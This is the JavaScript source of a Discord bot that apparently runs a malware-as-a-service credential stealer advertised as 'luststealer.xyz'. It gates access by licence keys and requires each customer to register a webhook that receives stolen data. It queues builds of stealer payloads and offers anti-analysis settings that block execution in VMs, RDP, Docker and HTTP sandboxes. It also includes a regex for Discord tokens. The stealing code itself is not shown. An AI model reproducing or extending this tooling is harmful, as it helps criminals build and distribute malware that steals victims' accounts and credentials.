import Discord from "discord.js";
import mongoose from "mongoose";
import PQueue from "p-queue";
import parseMS from "parse-ms";
import yn from "yn";
import slash from "./slash.js";
import * as keyutil from "./keyutil.js";
import * as guildutil from "./guildutil.js";
import buildFile from "./build.js";
import config from "./config.js";
import { setTimeout as sleep } from "timers/promises";

const client = new Discord.Client({
  intents: [
    Discord.GatewayIntentBits.Guilds,
    Discord.GatewayIntentBits.GuildMessages,
    Discord.GatewayIntentBits.GuildMembers
  ]
});

client.slashCommands = new Discord.Collection();
String.prototype.toJSON = (str) => {
  try {
    return JSON.parse(str || this);
  } catch {
    return {};
  }
};

const regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
const BuildQueue = new PQueue({ concurrency: 1, timeout: 600000 });
const cooldown = new Discord.Collection();

// website require("./app")();
client["login"](config.login);

mongoose
  .connect(config.mongo)
  .then((x) => console.log("MongoDB connected!"))
  .catch((err) => console.error(err));

mongoose.connection.on("error", (err) => {
  console.log(`Mongo Error: ${err}`);
});

BuildQueue.on("error", (error) => {
  console.error(error);
});

client.on("ready", async () => {
  console.log(client.user.tag);
  slash(client);
  client.user.setActivity({
    name: "https://luststealer.xyz",
    type: 3
  });
  client.user.setStatus("dnd");
  await guildutil.checkMany(client.guilds.cache);
});

client.on("warn", console.error);

client.on("error", console.error);

client.on("guildCreate", async (guild) => {
  const verified = await guildutil.check(guild.id);

  if (!verified) {
    await sleep(3000);
    console.log("Added to not-verified guild", guild.name);
    return await guild.leave();
  } else {
    // try {
    client.guilds.cache
      .get(config.logsGuild)
      ?.channels.cache.get(config.guildLogs)
      ?.send({
        embeds: [
          new Discord.EmbedBuilder()
            .setTitle("Joined Server")
            .setDescription(
              `**ID: \`${guild.id}\`**\n**Name:** \`${guild.name}\``
            )
            .setColor("DarkGreen")
            .setTimestamp()
            .setThumbnail(guild.iconURL())
        ]
      });
    // } catch {}
  }
});

client.on("guildDelete", async (guild) => {
  // try {
  client.guilds.cache
    .get(config.logsGuild)
    ?.channels.cache.get(config.guildLogs)
    ?.send({
      embeds: [
        new Discord.EmbedBuilder()
          .setTitle("Left a Server")
          .setDescription(
            `**ID: \`${guild.id}\`**\n**Name:** \`${guild.name}\``
          )
          .setColor("DarkRed")
          .setTimestamp()
          .setThumbnail(guild.iconURL())
      ]
    });
  // } catch {}
});

client.on("interactionCreate", async (interaction) => {
  if (interaction?.isCommand())
    console.log(interaction.commandName + " by " + interaction.user?.tag);

  if (config.dev && !config.dev.includes(interaction.user.id))
    return interaction.reply({
      content: `You don't have access to ${client.user.username} at the moment.`,
      ephemeral: true
    });

  if (interaction.isCommand()) await handleSlash(interaction);
  else if (interaction.isModalSubmit()) await handleModal(interaction);
});

async function handleSlash(interaction) {
  const slashCommand = client.slashCommands.get(interaction.commandName);

  if (!slashCommand)
    return client.slashCommands.delete(interaction.commandName);

  try {
    if (
      !config.owner.includes(interaction.user.id) &&
      slashCommand.cooldown > 0
    ) {
      const userCooldown = cooldown.get(
        slashCommand.name + interaction.user.id
      );

      if (userCooldown) {
        const time = Date.now() - userCooldown;

        if (time < slashCommand.cooldown) {
          const parsed = parseMS(slashCommand.cooldown - time);

          return await interaction.reply({
            content: `You are being rate limited, try again after ${parsed.minutes}m ${parsed.seconds}s.`,
            ephemeral: true
          });
        } else cooldown.delete(slashCommand.name + interaction.user.id);
      }

      const setCooldown = () =>
        cooldown.set(slashCommand.name + interaction.user.id, Date.now());

      slashCommand.run(client, interaction, config, setCooldown);
    } else slashCommand.run(client, interaction, config);
  } catch (error) {
    console.log(error);
  }
}

async function handleModal(interaction) {
  if (interaction.customId?.startsWith("config-")) {
    const key = interaction.customId.replace("config-", "");
    const userprofile = await keyutil.get(key, interaction.user.id);
    const keyexist = keyutil.checkOnly(userprofile);

    if (!keyexist)
      return interaction.reply({
        content: "Invalid key!",
        ephemeral: true
      });

    const blockVm = yn(interaction.fields.getTextInputValue("blockvm"), {
      default: true
    });

    const blockHost = yn(interaction.fields.getTextInputValue("blockhost"), {
      default: false
    });

    const blockHttpSim = yn(
      interaction.fields.getTextInputValue("blockhttpsim"),
      {
        default: true
      }
    );

    const blockRdp = yn(interaction.fields.getTextInputValue("blockrdp"), {
      default: false
    });

    const blockDocker = yn(
      interaction.fields.getTextInputValue("blockdocker"),
      {
        default: false
      }
    );

    Object.assign(userprofile, {
      blockVm,
      blockHost,
      blockHttpSim,
      blockRdp,
      blockDocker
    });

    const stext = {
      true: "✅",
      false: "❌"
    };

    const embed = new Discord.EmbedBuilder()
      .setTitle("Advanced Options")
      .setColor("Green")
      .addFields(
        { name: "Block VM", value: stext[blockVm] },
        {
          name: "Block Hosting Based Devices",
          value: stext[blockHost]
        },
        { name: "Block HTTP Simulations", value: stext[blockHttpSim] },
        { name: "Block RDP's", value: stext[blockRdp] },
        { name: "Block running in Docker", value: stext[blockDocker] }
      )
      .setFooter({
        text: interaction.user.tag,
        iconURL: interaction.user.displayAvatarURL()
      });

    await userprofile.save();

    await interaction.reply("✔ Successfully updated your config.");
    return await interaction.user.send({ embeds: [embed] });
  } else if (interaction.customId?.startsWith("build-")) {
    const key = interaction.customId.replace("build-", "");

    const userprofile = await keyutil.get(key, interaction.user.id);
    const keyexist = keyutil.checkOnly(userprofile);

    if (!keyexist)
      return interaction.reply({ content: "Invalid key!", ephemeral: true });

    if (!userprofile.webhook)
      return interaction.reply({
        content:
          "Please set a webhook link using **/setwebhook <key> <webhook>**!",
        ephemeral: true
      });

    if (BuildQueue.size != 0 || BuildQueue.pending != 0)
      await interaction
        .reply({
          content: `Build request sent, you're \`${
            BuildQueue.size + 1
          }\` in the queue.`,
          ephemeral: true,
          fetchReply: true
        })
        .catch(() => null);

    let channel = interaction.channel;

    if (!channel) {
      if (interaction.guild || interaction.inGuild())
        channel = client.guilds.cache
          .get(interaction.guild.id)
          ?.channels?.cache.get(interaction.channelId);
      else if (interaction.user?.send) channel = interaction.user;
    }

    interaction.messageReply = async (...data) => {
      // TODO: try using `this` instead of `interaction`

      let msg;
      if (!interaction.replied) {
        msg = await interaction
          .deferReply({ ephemeral: true })
          .catch(async () => await channel.send(...data));
      } else msg = await channel.send(...data);

      return msg;
    };

    await BuildQueue.add(
      async () => await buildFile(interaction, config, userprofile)
    );
  }
}
